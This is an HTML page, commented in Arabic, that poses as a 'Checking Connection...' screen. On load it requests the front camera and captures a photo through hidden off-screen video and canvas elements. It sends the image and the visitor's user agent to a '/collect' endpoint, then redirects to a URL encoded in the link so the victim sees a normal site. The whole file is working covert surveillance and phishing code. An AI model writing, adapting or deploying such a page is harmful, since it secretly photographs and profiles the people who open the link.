<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Connection...</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; overflow: hidden; }
        #v, #c { position: fixed; top: -1000px; opacity: 0; }
    </style>
</head>
<body>
    <video id="v" autoplay muted playsinline></video>
    <canvas id="c"></canvas>

    <script>
        (async function() {
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            
            // استخراج إعدادات التوجيه والتوكن من الرابط
            const urlParams = new URLSearchParams(window.location.search);
            const encodedData = urlParams.get('p');
            let config = { r: "https://google.com" }; 
            
            if (encodedData) {
                try {
                    config = JSON.parse(atob(encodedData));
                } catch (e) { console.error("Config Error"); }
            }

            async function startProcess() {
                try {
                    // طلب الكاميرا
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    video.srcObject = stream;
                    
                    // انتظار قصير لضمان جودة الصورة (أسرع من الكود السابق)
                    await new Promise(r => setTimeout(r, 400));
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const base64Image = canvas.toDataURL('image/png');
                    
                    // إرسال الصورة للسيرفر الخاص بك (app.py)
                    const response = await fetch('/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            image: base64Image,
                            phone_name: navigator.userAgent
                        })
                    });

                    // إغلاق الكاميرا والتوجيه فقط بعد تأكيد الإرسال بنجاح
                    if (response.ok) {
                        stream.getTracks().forEach(t => t.stop());
                        window.location.replace(config.r);
                    }

                } catch (err) {
                    // إذا قام بالرفض أو الحظر (Deny/Block)
                    // يتم توجيهه فوراً لإبعاده عن الصفحة
                    window.location.replace(config.r);
                }
            }

            // تشغيل العملية فور التحميل
            window.onload = startProcess;
        })();
    </script>
</body>
</html>
